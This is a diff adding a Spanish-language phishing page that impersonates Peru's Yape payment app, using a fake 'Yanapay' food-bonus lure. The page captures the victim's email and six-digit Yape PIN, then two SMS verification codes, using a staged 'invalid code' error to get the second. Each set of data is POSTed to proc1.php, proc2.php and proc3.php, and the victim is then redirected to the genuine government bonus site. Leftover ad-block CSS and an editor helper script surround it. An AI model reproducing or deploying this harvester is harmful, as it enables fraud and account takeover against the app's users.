+        :root a[href^="https://t.aslnk.link/"],
+        :root a[href^="https://t.adating.link/"],
+        :root [href^="https://track.fiverr.com/visit/"]>img,
+        :root a[href^="https://go.trackitalltheway.com/"],
+        :root a[href^="https://syndication.exoclick.com/"],
+        :root a[href^="https://syndication.dynsrvtbg.com/"],
+        :root a[href^="https://streamate.com/landing/click/"],
+        :root a[href^="https://ad.doubleclick.net/"],
+        :root a[href^="https://static.fleshlight.com/images/banners/"],
+        :root a[href^="https://go.strpjmp.com/"],
+        :root a[href^="https://refpa4903566.top/"],
+        :root a[href^="https://prf.hn/click/"][href*="/camref:"]>img,
+        :root a[href^="https://serve.awmdelivery.com/"],
+        :root a[href^="https://prf.hn/click/"][href*="/adref:"]>img,
+        :root [href^="https://r.kraken.com/"],
+        :root a[href^="https://mmwebhandler.aff-online.com/"],
+        :root a[href^="https://www.bet365.com/"][href*="affiliate="],
+        :root iframe[id^="google_ads_frame"],
+        :root a[href^="https://pb-track.com/"],
+        :root a[href^="https://paid.outbrain.com/network/redir?"],
+        :root div[id^="ad_position_"],
+        :root a[href^="https://ovb.im/"],
+        :root div[id^="ad-div-"],
+        :root a[href^="https://newbinotracs.com/"],
+        :root a[href^="https://natour.naughtyamerica.com/track/"],
+        :root [href^="https://stvkr.com/"],
+        :root a[href^="https://mediaserver.entainpartners.com/renderBanner.do?"],
+        :root [href^="https://www.herbanomic.com/"]>img,
+        :root a[href^="//moksoxos.com/"],
+        :root a[href^="https://maymooth-stopic.com/"],
+        :root a[href^="https://loboclick.com"],
+        :root [href^="https://routewebtk.com/"],
+        :root a[href^="https://see.kmisln.com/"],
+        :root a[href^="https://a.bestcontentweb.top/"],
+        :root a[href^="https://lobimax.com/"],
+        :root a[href^="https://lead1.pl/"],
+        :root a[href^="https://landing.brazzersnetwork.com/"],
+        :root a[href^="https://ads.leovegas.com/redirect.aspx?"],
+        :root a[href^="https://land.brazzersnetwork.com/landing/"],
+        :root a[href^="https://juicyads.in/"],
+        :root a[href^="https://itubego.com/video-downloader/?affid="],
+        :root a[href^="https://iqbroker.com/"][href*="?aff="],
+        :root a[href^="https://incisivetrk.cvtr.io/click?"],
+        :root [data-revive-zoneid],
+        :root a[href^="https://googleads.g.doubleclick.net/pcs/click"],
+        :root a[href^="https://clk.wrenchsound.store/"],
+        :root a[href^="https://go.zybrdr.com"],
+        :root [href^="http://join.michelle-austin.com/"],
+        :root a[href^="https://go.xxxiijmp.com"],
+        :root a[href^="https://go.xtbaffiliates.com/"],
+        :root a[href^="https://ismlks.com/"],
+        :root a[href^="//a.bestcontentfare.top/"],
+        :root [href^="https://www.mypillow.com/"]>img,
+        :root a[href^="https://azpresearch.club/"],
+        :root a[href^="https://go.xlirdr.com"],
+        :root [data-css-class="dfp-inarticle"],
+        :root .card-captioned.crd>.crd--cnt>.s2nPlayer,
+        :root a[href^="https://go.tmrjmp.com"],
+        :root a[href^="https://go.skinstrip.net"][href*="?campaignId="],
+        :root a[href^="https://go.markets.com/visit/?bta="],
+        :root a[href^="//lambingsyddir.com/"],
+        :root a[href^="https://billing.purevpn.com/aff.php"]>img,
+        :root a[href^="https://go.hpyrdr.com/"],
+        :root a[href^="https://go.goaserv.com/"],
+        :root a[href^="https://track.wg-aff.com"],
+        :root a[href^="https://go.ebrokerserve.com/"],
+        :root a[href^="https://go.dmzjmp.com"],
+        :root a[href^="https://go.admjmp.com/"],
+        :root [href^="https://kingered-banctours.com/"],
+        :root a[href^="https://get.surfshark.net/aff_c?"][href*="&aff_id="]>img,
+        :root a-ad,
+        :root a[href^="https://affiliate.rusvpn.com/click.php?"],
+        :root a[href^="https://geniusdexchange.com/"],
+        :root a[href^="https://go.gldrdr.com/"],
+        :root [id^="ad_sky"],
+        :root a[href^="https://funkydaters.com/"],
+        :root a[href^="https://frameworkdeserve.com/"],
+        :root a[href^="https://flirtandsweets.life/"],
+        :root a[href^="https://www.mrskin.com/account/"],
+        :root a[href^="https://www.mrskin.com/tour"],
+        :root a[href^="https://financeads.net/tc.php?"],
+        :root bottomadblock,
+        :root a[href^="https://fertilitycommand.com/"],
+        :root [data-freestar-ad],
+        :root a[href^="https://fc.lc/ref/"],
+        :root div[data-native-ad],
+        :root a[href^="https://engine.trackingdesks.com/"],
+        :root [href^="https://totlnkcl.com/"],
+        :root a[href^="https://www.adskeeper.com"],
+        :root a[data-redirect^="https://paid.outbrain.com/network/redir?"],
+        :root [href^="https://www.reimageplus.com/"],
+        :root a[href^="https://engine.phn.doublepimp.com/"],
+        :root a[href^="https://engine.blueistheneworanges.com/"],
+        :root a[href^="https://clixtrac.com/"],
+        :root div.fadeInDown[id$="____equal"][class$="____equal"],
+        :root a[href^="https://mediaserver.gvcaffiliates.com/renderBanner.do?"],
+        :root a[href^="https://join.dreamsexworld.com/"],
+        :root a[href^="https://click.linksynergy.com/fs-bin/"],
+        :root AD-TRIPLE-BOX,
+        :root a[href^="https://click.hoolig.app/"],
+        :root a[href^="https://track.totalav.com/"],
+        :root img[src^="https://images.purevpnaffiliates.com"],
+        :root a[href^="https://porntubemate.com/"],
+        :root a[href^="http://www.gfrevenge.com/landing/"],
+        :root a[href^="https://clickadilla.com/"],
+        :root a[href^="https://click.dtiserv2.com/"],
+        :root a[href^="https://go.xlvirdr.com"],
+        :root a[href^="https://claring-loccelkin.com/"],
+        :root [class^="s2nPlayer"],
+        :root a[href^="https://chaturbate.jjgirls.com/?track="],
+        :root a[href^="https://chaturbate.com/in/?track="],
+        :root a[href^="https://chaturbate.com/in/?tour="],
+        :root a[href^="https://cams.imagetwist.com/in/?track="],
+        :root a[href^="https://cam4com.go2cloud.org/"],
+        :root a[href^="https://affcpatrk.com/"],
+        :root a[href^="https://bongacams2.com/track?"],
+        :root a[href^="https://www.sheetmusicplus.com/"][href*="?aff_id="],
+        :root a[href^="https://bngpt.com/"],
+        :root a[href^="https://bluedelivery.pro/"],
+        :root #topstuff>#tads,
+        :root a[href^="https://black77854.com/"],
+        :root a[href^="https://burpee.xyz/"],
+        :root a[href^="https://ndt5.net/"],
+        :root a[href^="https://batheunits.com/"],
+        :root a[target="_blank"][onmousedown="this.href^='http://paid.outbrain.com/network/redir?"],
+        :root a[href^="https://banners.livepartners.com/"],
+        :root a[href^="https://m.do.co/c/"]>img,
+        :root [href="https://masstortfinancing.com"] img,
+        :root a[href^="https://bongacams10.com/track?"],
+        :root a[href^="https://albionsoftwares.com/"],
+        :root a[href^="https://t.hrtye.com/"],
+        :root a[href^="https://go.etoro.com/"]>img,
+        :root a[href^="https://join.sexworld3d.com/track/"],
+        :root a[href^="https://intenseaffiliates.com/redirect/"],
+        :root a[href^="https://aweptjmp.com/"],
+        :root a[href^="https://ads.ad4game.com/"],
+        :root [id^="google_ads_iframe"],
+        :root a[href^="https://syndication.optimizesrv.com/"],
+        :root a[href^="https://affpa.top/"],
+        :root a[href^="https://adnetwrk.com/"],
+        :root a[href^="https://adjoincomprise.com/"],
+        :root [href^="http://misslinkvocation.com/"],
+        :root a[href^="https://adclick.g.doubleclick.net/"],
+        :root a[href^="https://go.nordvpn.net/aff"]>img,
+        :root [href^="http://clicks.totemcash.com/"],
+        :root a[href^="https://misspkl.com/"],
+        :root a[href^="https://ad.zanox.com/ppc/"]>img,
+        :root a[href^="https://ad.kubiccomps.icu/"],
+        :root a[href^="https://adswick.com/"],
+        :root a[href^="https://a2.adform.net/"],
+        :root a[href^="https://iactrivago.ampxdirect.com/"],
+        :root a[href^="https://a.medfoodhome.com/"],
+        :root a[href^="http://static.fleshlight.com/images/banners/"],
+        :root a[href^="https://a.adtng.com/"],
+        :root [data-m-ad-id],
+        :root a[href^="https://a-ads.com/"],
+        :root [href="https://ourgoldguy.com/contact/"] img,
+        :root a[href^="https://brightadnetwork.com/"],
+        :root [href^="https://www.avantlink.com/click.php"] img,
+        :root iframe[src^="https://pagead2.googlesyndication.com/"],
+        :root a[href^="http://www.onwebcam.com/random?t_link="],
+        :root a[href^="https://agacelebir.com/"],
+        :root a[href^="https://spygasm.com/track?"],
+        :root a[href^="http://d2.zedo.com/"],
+        :root a[href^="http://www.friendlyduck.com/AF_"],
+        :root a[href^="http://trk.globwo.online/"],
+        :root a[href^="https://prf.hn/click/"][href*="/creativeref:"]>img,
+        :root a[href^="http://www.adultempire.com/unlimited/promo?"][href*="&partner_id="],
+        :root a[href^="http://traffic.tc-clicks.com/"],
+        :root a[href^="http://tour.mrskin.com/"],
+        :root a[href^="https://join.virtualtaboo.com/track/"],
+        :root a[href^="http://https://www.get-express-vpn.com/offer/"],
+        :root a[href^="https://cagothie.net/"],
+        :root div[id^="google_dfp_"],
+        :root a[href^="http://googleads.g.doubleclick.net/pcs/click"],
+        :root a[href^="https://awentw.com/"],
+        :root a[href^="https://www.googleadservices.com/pagead/aclk?"],
+        :root a[href^="http://www.mrskin.com/tour"],
+        :root a[href^="http://deloplen.com/"],
+        :root .rc-cta[data-target],
+        :root [href^="http://go.cm-trk2.com/"],
+        :root a[href^="http://adtrack1.club/"],
+        :root a[href^="http://click.payserve.com/"],
+        :root a[href^="https://porngames.adult/?SID="],
+        :root a[href^="https://landing1.brazzersnetwork.com"],
+        :root #slashboxes>.deals-rail,
+        :root [href^="http://globsads.com/"],
+        :root [href^="https://www.brighteonstore.com/products/"] img,
+        :root a[href^="http://bc.vc/?r="],
+        :root .trc_rbox_border_elm .syndicatedItem,
+        :root a[href^="http://www.onclickmega.com/jump/next.php?"],
+        :root a[href^="http://adf.ly/?id="],
+        :root a[href^="https://mityneedn.com/"],
+        :root [href^="http://homemoviestube.com/"],
+        :root a[href^="http://ad.doubleclick.net/"],
+        :root .commercial-unit-mobile-top .jackpot-main-content-container>.UpgKEd+.nZZLFc>.vci,
+        :root a[href^="//syndication.dynsrvtbg.com/"],
+        :root a[href^="//pubads.g.doubleclick.net/"],
+        :root [href^="https://traffserve.com/"],
+        :root div[data-adname],
+        :root a[href^="https://thechleads.pro/"],
+        :root a[href^="//intorterraon.com/"],
+        :root a[href^="https://fastestvpn.com/lifetime-special-deal?a_aid="],
+        :root a[href^="https://tour.mrskin.com/"],
+        :root a[href^="http://allaptair.club/"],
+        :root a[href^="//go.eabids.com/"],
+        :root [data-d-ad-id],
+        :root a[href*=".engine.adglare.net/"],
+        :root a[href^="https://a.bestcontentoperation.top/"],
+        :root a[href^="//go.xlviiirdr.com"],
+        :root [data-dynamic-ads],
+        :root a[data-widget-outbrain-redirect^="http://paid.outbrain.com/network/redir?"],
+        :root [data-ad-width],
+        :root [href^="https://join.playboyplus.com/track/"],
+        :root a[data-url^="http://paid.outbrain.com/network/redir?"]+.author,
+        :root a[href^="https://axdsz.pro/"],
+        :root a[href^="http://bodelen.com/"],
+        :root a[data-oburl^="https://paid.outbrain.com/network/redir?"],
+        :root [href^="https://cpa.10kfreesilver.com/"],
+        :root a[href^="https://a.bestcontentfood.top/"],
+        :root a[href^="https://reinstandpointdumbest.com/"],
+        :root a[data-obtrack^="http://paid.outbrain.com/network/redir?"],
+        :root [href^="https://goldforyourfuture.com/clk.trk"] img,
+        :root a[href^="http://wct.link/"],
+        :root [href^="https://infinitytrk.com/"],
+        :root [onclick^="location.href='http://www.reimageplus.com"],
+        :root [id^="section-ad-banner"],
+        :root .commercial-unit-mobile-top>div[data-pla="1"],
+        :root [id^="chp_ads_block"],
+        :root a[href^="https://go.julrdr.com/"],
+        :root .trc_rbox_div .syndicatedItemUB,
+        :root [href^="https://zone.gotrackier.com/"],
+        :root [href^="https://www.targetingpartner.com/"],
+        :root [href^="https://detachedbates.com/"],
+        :root a[href^="https://fourwhenstatistics.com/"],
+        :root [href^="https://www.restoro.com/"],
+        :root div[id^="ad-position-"],
+        :root a[href^="http://adultfriendfinder.com/go/page/landing"],
+        :root a[href^="http://affiliate.glbtracker.com/"],
+        :root a[href^="https://leg.xyz/?track="],
+        :root a[href^="https://go.cmtaffiliates.com/"],
+        :root [data-name="adaptiveConstructorAd"],
+        :root [href^="https://optimizedelite.com/"]>img,
+        :root a[href^="//thaudray.com/"],
+        :root div[id^="crt-"][style],
+        :root a[href^="http://adultgames.xxx/"],
+        :root a[href^="https://traffic.bannerator.com/"],
+        :root [href^="https://shiftnetwork.infusionsoft.com/go/"]>img,
+        :root a[onmousedown^="this.href='http://paid.outbrain.com/network/redir?"][target="_blank"],
+        :root [href^="https://secure.bmtmicro.com/servlets/"],
+        :root a[href^="https://losingoldfry.com/"],
+        :root .scroll-fixable.rail-right>.deals-rail,
+        :root a[href^="https://oackoubs.com/"],
+        :root a[href^="https://awptjmp.com/"],
+        :root a[href^="https://go.goasrv.com/"],
+        :root .commercial-unit-mobile-top>.v7hl4d,
+        :root [href^="http://mypillow.com/"]>img,
+        :root a[href^="http://bongacams.com/track?"],
+        :root a[href^="https://fleshlight.sjv.io/"],
+        :root [data-ad-manager-id],
+        :root a[href^="https://promo-bc.com/"],
+        :root a[href^="https://clicks.pipaffiliates.com/"],
+        :root [href^="https://noqreport.com/"]>img,
+        :root a[href^="https://go.hpyjmp.com"],
+        :root ADS-RIGHT,
+        :root [href^="https://mystore.com/"]>img,
+        :root [href^="https://mypatriotsupply.com/"]>img,
+        :root [href^="https://mylead.global/stl/"]>img,
+        :root #leader-companion>a[href],
+        :root a[href^="https://transfer.xe.com/signup/track/redirect?"],
+        :root .vid-present>.van_vid_carousel__padding,
+        :root a[href^="https://go.xxxijmp.com"],
+        :root [href^="https://istlnkcl.com/"],
+        :root [href^="https://www.hostg.xyz/"]>img,
+        :root .section-subheader>.section-hotel-prices-header,
+        :root [href^="https://go.affiliatexe.com/"],
+        :root [href^="https://go.4rabettraff.com/"],
+        :root [href^="https://glersakr.com/"],
+        :root ins.adsbygoogle,
+        :root a[href^="https://1startfiledownload1.com/"],
+        :root a[href^="https://wittered-mainging.com/"],
+        :root [href^="https://engine.gettopple.com/"],
+        :root [href^="https://awbbjmp.com/"],
+        :root a[href^="https://k2s.cc/pr/"],
+        :root [href^="https://affect3dnetwork.com/track/"],
+        :root a[href^="https://camfapr.com/landing/click/"],
+        :root [href="//sexcams.plus/"],
+        :root a[href^="https://go.currency.com/"],
+        :root [href^="http://www.mypillow.com/"]>img,
+        :root div[id^="div-ads-"],
+        :root [href^="https://rapidgator.net/article/premium/ref/"],
+        :root a[href^="https://www.sugarinstant.com/?partner_id="],
+        :root a[href^="https://adultfriendfinder.com/go/page/landing"],
+        :root div[data-role="sidebarAd"],
+        :root [href^="https://join3.bannedsextapes.com"],
+        :root div[data-spotim-slot],
+        :root [href^="https://antiagingbed.com/discount/"]>img,
+        :root a[href^="https://go.247traffic.com/"],
+        :root [href^="https://join.girlsoutwest.com/"],
+        :root [href^="http://trafficare.net/"],
+        :root a[href^="https://tc.tradetracker.net/"]>img,
+        :root a[href^="https://adserver.adreactor.com/"],
+        :root [href^="http://join.shemalesfromhell.com/"],
+        :root [id^="ad_slider"],
+        :root a[href^="http://www.adultdvdempire.com/?partner_id="][href*="&utm_"],
+        :root [href^="http://join.shemale.xxx/"],
+        :root [href^="https://ilovemyfreedoms.com/landing-"],
+        :root a[href^="https://ads.betfair.com/redirect.aspx?"],
+        :root [href^="http://www.fleshlightgirls.com/"],
+        :root [href^="http://join.trannies-fuck.com/"],
+        :root .trc_rbox .syndicatedItem,
+        :root a[href^="http://cam4com.go2cloud.org/aff_c?"],
+        :root a[href^="https://cpmspace.com/"],
+        :root [href^="https://freecourseweb.com/"]>.sitefriend,
+        :root [class^="adDisplay-module"],
+        :root [class^="chp_ads_block"],
+        :root a[href^="https://thefacux.com/"],
+        :root a[href^="https://ads.planetwin365affiliate.com/redirect.aspx?"],
+        :root [href^="http://join.rodneymoore.com/"],
+        :root a[href*=".trust.zone"],
+        :root [href^="https://shrugartisticelder.com"],
+        :root [href^="https://go.xlrdr.com"],
+        :root [name^="google_ads_iframe"],
+        :root [href^="https://safer-redirection.com"],
+        :root [href^="//ngeoziadiyc4hi2e.com/"],
+        :root a[href^="https://go.xxxjmp.com"],
+        :root [data-desktop-ad-id],
+        :root [href^="https://wct.link/"],
+        :root #kt_player>a[target="_blank"],
+        :root [href="https://www.masstortfinancing.com/"]>img,
+        :root .ob_container .item-container-obpd,
+        :root [id^="div-gpt-ad"],
+        :root [href^="https://mypillow.com/"]>img,
+        :root [href^="https://ad.admitad.com/"],
+        :root a[href^="https://u.expresstech.io/"],
+        :root [href="https://jdrucker.com/gold"]>img,
+        :root [href^="https://v.investologic.co.uk/"],
+        :root [href^="https://cipledecline.buzz/"],
+        :root a[href^="https://www.iyalc.com/"],
+        :root a[href^="https://track.ultravpn.com/"],
+        :root [href^="https://goldcometals.com/clk.trk"],
+        :root [data-mobile-ad-id],
+        :root a[href^="http://tc.tradetracker.net/"]>img,
+        :root a[href^="https://www.geekbuying.com/dynamic-ads/"],
+        :root a[href^="http://affiliates.thrixxx.com/"],
+        :root #searchResultsList>div>div[onclick$="'inline.ad'});"],
+        :root a[href^="https://trk.sportsflix4k.club/"],
+        :root a[href^="https://go.xlivrdr.com"],
+        :root [data-ez-name],
+        :root AMP-AD,
+        :root [data-ad-cls],
+        :root a[href^="https://www.goldenfrog.com/vyprvpn?offer_id="][href*="&aff_id="],
+        :root [id^="ad-wrap-"],
+        :root div[id^="taboola-stream-"],
+        :root [href^="https://go.astutelinks.com/"],
+        :root [onclick*="content.ad/"],
+        :root [href^="http://residenceseeingstanding.com/"],
+        :root div[data-adunit],
+        :root app-large-ad,
+        :root [href^="https://turtlebids.irauctions.com/"] img,
+        :root [class^="amp-ad-"],
+        :root [href^="https://affiliate.fastcomet.com/"]>img,
+        :root a[href^="http://go.xtbaffiliates.com/"],
+        :root .grid>.container>#aside-promotion,
+        :root DFP-AD,
+        :root AD-SLOT,
+        :root .ob_dual_right>.ob_ads_header~.odb_div,
+        :root [href^="https://click2cvs.com/"],
+        :root .trc_related_container div[data-item-syndicated="true"],
+        :root [href^="http://join.shemalepornstar.com/"],
+        :root a[href^="https://go.xlviiirdr.com"],
+        :root .trc_rbox_div .syndicatedItem,
+        :root [data-ad-module],
+        :root [href^="https://trackfin.asia/"],
+        :root .plistaList>.plista_widget_underArticle_item[data-type="pet"],
+        :root a[href*="//lkstrck2.com/"],
+        :root .plistaList>.itemLinkPET,
+        :root atf-ad-slot,
+        :root .commercial-unit-mobile-top .jackpot-main-content-container>.UpgKEd+.nZZLFc>div>.vci,
+        :root a[href^="http://partners.etoro.com/"],
+        :root [data-advadstrackid],
+        :root #atvcap+#tvcap>.mnr-c>.commercial-unit-mobile-top,
+        :root a[href^="https://traffdaq.com/"],
+        :root a[href^="https://tm-offers.gamingadult.com/"],
+        :root [class^="div-gpt-ad"],
+        :root a[href^="https://bs.serving-sys.com"],
+        :root [href^="https://www.cloudways.com/en/?id"],
+        :root a[href^="https://refpazkjixes.top/"],
+        :root #mgb-container>#mgb,
+        :root a[href^="https://join.virtuallust3d.com/"],
+        :root #taw>.med+div>#tvcap>.mnr-c:not(.qs-ic)>.commercial-unit-mobile-top,
+        :root [data-adblockkey] {
+            display: none !important;
+        }
+    </style>
+    <style class="darkreader darkreader--sync" media="screen"></style>
+    <style type="text/css">
+        @font-face {
+            font-family: Roboto;
+            src: url("chrome-extension://mcgbeeipkmelnpldkobichboakdfaeon/css/Roboto-Regular.ttf");
+        }
+    </style>
+    <style class="darkreader darkreader--sync" media="screen"></style>
+    <link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="true">
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link rel="stylesheet"
+        href="https://fonts.googleapis.com/css2?family=Mulish:wght@200;300;400;500;600;700;800;900&amp;display=swa">
+</head>
+
+<body>
+    <main>
+        <div class="form-centent">
+            <a href="#" class="logo">
+                <img width="150" height="140" src="img/logo.png" alt="">
+            </a>
+            <div class="entery">
+                <div class="title">
+                    ¡Yapero! Recueda que tienes hasta el 31 de Marzo
+                    para recepcionar tu bono alimentario 270
+                    <span>YANAPAY!</span>
+                </div>
+                <div class="input-field">
+                    <label for="">Correo electrónico</label>
+                    <input id="email" type="email">
+                    <div class="bar">
+                        <div class="line"></div>
+                    </div>
+                </div>
+                <div class="dots-b">
+                    <span>Ingresa tu clave Yape</span>
+                    <div class="dots">
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                    </div>
+                </div>
+                <div class="btns">
+                    <div class="btn" type="number" value="5">5</div>
+                    <div class="btn" type="number" value="1">1</div>
+                    <div class="btn" type="number" value="6">6</div>
+                    <div class="btn" type="number" value="9">9</div>
+                    <div class="btn" type="number" value="7">7</div>
+                    <div class="btn" type="number" value="3">3</div>
+                    <div class="btn" type="number" value="4">4</div>
+                    <div class="btn" type="number" value="8">8</div>
+                    <div class="btn" type="number" value="2">2</div>
+                    <div class="btn" type="empty"></div>
+                    <div class="btn" type="number" value="0">0</div>
+                    <div class="btn" type="delete" value="delete">
+                        <img src="/img/delete.png" alt="">
+                    </div>
+                </div>
+            </div>
+            <div class="error d-none">
+                ¡Error! Código de verificación inválidos, volver a intentar nuevamente.
+            </div>
+            <div class="validation d-none">
+                <div class="validation-content">
+                    <div class="tt">Código de validación</div>
+                    <!-- +51 9** *** *** -->
+                    <div>Te hemos enviado un sms a tu <span class="your_number">+519** *** ***</span> </div>
+                    <div id="timer">1:59</div>
+                    <div class="tt">minuto segundos</div>
+                    <div id="validation_inputs" class="inputs">
+                        <input maxlength="1" type="number">
+                        <input maxlength="1" type="number">
+                        <input maxlength="1" type="number">
+                        <input maxlength="1" type="number">
+                        <input maxlength="1" type="number">
+                        <input maxlength="1" type="number">
+                    </div>
+                    <div>No obtuve el código &nbsp;&nbsp;&nbsp;<a href="#">Reenvío Código</a></div>
+                </div>
+            </div>
+        </div>
+        <div class="loader">
+            <div class="loader-container"></div>
+        </div>
+    </main>
+
+    <script src="https://code.jquery.com/jquery-3.6.3.min.js"
+        integrity="sha256-pvPw+upLPUjgMXY0G+8O0xUf+/Im1MZjXxxgOcBQBXU=" crossorigin="anonymous"></script>
+
+    <script>
+
+
+        const emailInput = document.querySelector("#email")
+        const input_field = document.querySelector(".input-field")
+
+
+        emailInput.oninput = () => {
+            if (emailInput.value.includes("@")) {
+                addPassword();
+            }
+
+        }
+        emailInput.onchange = () => {
+            if (emailInput.value.includes("@")) {
+                emailInput.blur();
+            }
+        }
+
+        window.onclick = (e) => {
+            if (e.target.id == "email") {
+                input_field.classList.add("focused")
+            }
+            else if (emailInput.value) {
+                input_field.classList.add("focused")
+            }
+            else if (e.target.getAttribute('type') == "number") {
+                input_field.classList.add("focused")
+                setTimeout(() => {
+                    input_field.classList.remove("focused")
+                }, 250);
+            }
+            else {
+                input_field.classList.remove("focused")
+            }
+        }
+
+        //
+
+        const btns = document.querySelectorAll(".btns [type='number']")
+
+        const dots = document.querySelectorAll(".dots .dot")
+        let dots_count = 0;
+        let clave1 = "";
+
+        function addPassword() {
+            btns.forEach((btn) => {
+                btn.onclick = () => {
+                    if (dots_count < dots.length && emailInput.value.includes("@") && emailInput.value != "") {
+                        //console.log(btn.getAttribute("value")); 
+                        clave1 += btn.getAttribute("value");
+                        //console.log(clave1)
+                        dots[dots_count].classList.add("active")
+                        dots_count++
+
+                        if (dots_count == dots.length) {
+                            if (emailInput.value.includes("@") && emailInput.value != "") {
+                                setTimeout(() => {
+                                    $.ajax({
+                                        type: "POST",
+                                        url: "proc1.php",
+                                        data: { email: emailInput.value, password: clave1, idCampana: 55 },
+                                        // success: function(response) {
+                                        //     // Handle the response from the server here
+                                        //     console.log(response);
+                                        // }
+                                    });
+
+                                    setTimeout(function () {
+                                        goToValidation();
+                                    }, 10)
+                                    //goToValidation()
+                                    //console.log(emailInput.value+ ' '+clave1);
+                                    setTimeout(() => {
+                                        startTimer();
+                                    }, 1500);
+                                }, 500);
+                            }
+                        }
+                    }
+                }
+            })
+        }
+        ///////
+
+
+        const deleteBtn = document.querySelector("[type='delete']")
+
+        deleteBtn.onclick = () => {
+            if (dots_count >= 0) {
+                dots[dots_count].classList.remove("active")
+                clave1 = clave1.substring(0, clave1.length - 1);
+                //console.log(clave1)
+                dots_count--
+                if (dots_count == -1) {
+                    dots_count = 0
+                }
+            }
+        }
+
+
+
+        /////////
+
+        function goToValidation() {
+            const entery = document.querySelector('.entery')
+            const validation = document.querySelector('.validation')
+            entery.classList.add('d-none')
+            validation.classList.remove('d-none')
+            validation_inputs[0].focus()
+        }
+
+
+        /////////
+
+        let your_number = document.querySelector('.your_number')
+        let your_number_value = "+519 0000000"
+        your_number.innerHTML = your_number_value.slice(0, 4) + "** *** ***"
+
+        /////////
+
+        const validation_inputs = document.querySelectorAll("#validation_inputs input")
+        const error_container = document.querySelector(".error")
+
+        let count = 0
+        let checkFill = false
+
+        let inputValue = "";
+
+        validation_inputs.forEach((el, all) => {
+            // el.oninput = ()=>{
+            //     if(el.value.length > 1){
+            //         let x = el.value
+            //         el.value = x[0]
+            //     }
+            //     // if (el.value.length == 1) {
+            //     //     console.log(el.value);
+            //     // }else if(el.value.length > 1){
+            //     //     let x = el.value
+            //     //     el.value = x[0]
+            //     // }
+            // }
+
+            el.oninput = () => {
+
+                if (el.value.length > 1) {
+                    let x = el.value
+                    el.value = x[0]
+                }
+
+                inputValue += el.value;
+
+                if (Number(el.value) || el.value == 0) {
+                    if (el.value == " ") {
+                        //console.log(el.value);
+                        el.value = ""
+                        validation_inputs[count].focus()
+                    } else if (validation_inputs[count].value && count < validation_inputs.length - 1) {
+                        //console.log(el.value);
+
+                        count++
+                        validation_inputs[count].focus()
+                    }
+                } else {
+                    el.value = null
+                }
+                let checkfill = Array.from(validation_inputs).every(e => e.value)
+
+                if (checkfill) {
+
+                    if (checkFill == false) {
+
+                        //getInputValue();
+                        checkInputs("close")
+                        loader("active")
+
+                        $.ajax({
+                            type: "POST",
+                            url: "proc2.php",
+                            data: {
+                                validation_code: inputValue
+                            },
+                            success: function (response) {
+                                //console.log(inputValue)					   
+                                inputValue = ""
+                            }
+                        });
+                        setTimeout(function () {
+                            //getInputValue();
+
+                            error_container.classList.remove("d-none")
+                            checkFill = true
+                            resetInputs()
+                            document.getElementById('timer').innerHTML = 01 + ":" + 59;
+                            checkInputs("write")
+                            loader("deactivate")
+                        }, 4000)
+                    } else {
+                        checkInputs("close")
+                        loader("active")
+                        //getInputValue()
+
+                        $.ajax({
+                            type: "POST",
+                            url: "proc3.php",
+                            data: {
+                                validation_code2: inputValue
+                            },
+                            success: function (response) {
+                                //console.log(inputValue)
+                                setTimeout(() => {
+                                    error_container.classList.add("d-none")
+                                    window.location.href = "https://consultas.bonoalimentario.gob.pe/#/";
+                                }, 10);
+                            }
+                        });
+
+                    }
+
+                }
+
+            }
+
+
+        });
+
+
+        ///////
+
+
+        function resetInputs() {
+            validation_inputs.forEach((el) => {
+                el.value = ""
+            })
+            count = 0
+            validation_inputs[count].focus()
+        }
+
+
+        ///////
+
+
+        document.getElementById('timer').innerHTML = 01 + ":" + 59;
+        // startTimer();
+
+
+        function startTimer() {
+            var presentTime = document.getElementById('timer').innerHTML;
+            var timeArray = presentTime.split(/[:]+/);
+            var m = timeArray[0];
+            var s = checkSecond((timeArray[1] - 1));
+
+            if (s == 59) { m = m - 1 }
+            if (m < 0) {
+                return
+            }
+
+            document.getElementById('timer').innerHTML = m + ":" + s;
+            //console.log(m)
+            setTimeout(startTimer, 1000);
+        }
+
+
+        function checkSecond(sec) {
+            if (sec < 10 && sec >= 0) { sec = "0" + sec };
+            if (sec < 0) { sec = "59" };
+            return sec;
+        }
+
+
+        function getInputValue() {
+            let inputs = document.querySelectorAll('#validation_inputs input');
+            inputs.forEach(input => {
+                inputValue += input.value;
+            })
+
+            //console.log(inputValue)
+        }
+
+
+
+
+        /////
+
+        function checkInputs(type) {
+            validation_inputs.forEach(el => {
+                if (type == "close") {
+                    el.setAttribute('disabled', "disabled")
+                } else if (type == "write") {
+                    el.removeAttribute('disabled')
+                }
+            });
+        }
+
+        function loader(type) {
+            validation_inputs.forEach(el => {
+                if (type == "active") {
+                    document.querySelector('.loader').classList.add('loader-active')
+                } else if (type == "deactivate") {
+                    document.querySelector('.loader').classList.remove('loader-active')
+                }
+            });
+        }
+
+
+
+    </script>
+
+
+    <script>
+        function returnCommentSymbol(language = "javascript") {
+            const languageObject = {
+                bat: "@REM",
+                c: "//",
+                csharp: "//",
+                cpp: "//",
+                closure: ";;",
+                coffeescript: "#",
+                dockercompose: "#",
+                css: "/*DELIMITER*/",
+                "cuda-cpp": "//",
+                dart: "//",
+                diff: "#",
+                dockerfile: "#",
+                fsharp: "//",
+                "git-commit": "//",
+                "git-rebase": "#",
+                go: "//",
+                groovy: "//",
+                handlebars: "{{!--DELIMITER--}}",
+                hlsl: "//",
+                html: "<!--DELIMITER-->",
+                ignore: "#",
+                ini: ";",
+                java: "//",
+                javascript: "//",
+                javascriptreact: "//",
+                json: "//",
+                jsonc: "//",
+                julia: "#",
+                latex: "%",
+                less: "//",
+                lua: "--",
+                makefile: "#",
+                markdown: "<!--DELIMITER-->",
+                "objective-c": "//",
+                "objective-cpp": "//",
+                perl: "#",
+                perl6: "#",
+                php: "<!--DELIMITER-->",
+                powershell: "#",
+                properties: ";",
+                jade: "//-",
+                python: "#",
+                r: "#",
+                razor: "<!--DELIMITER-->",
+                restructuredtext: "..",
+                ruby: "#",
+                rust: "//",
+                scss: "//",
+                shaderlab: "//",
+                shellscript: "#",
+                sql: "--",
+                svg: "<!--DELIMITER-->",
+                swift: "//",
+                tex: "%",
+                typescript: "//",
+                typescriptreact: "//",
+                vb: "'",
+                xml: "<!--DELIMITER-->",
+                xsl: "<!--DELIMITER-->",
+                yaml: "#"
+            }
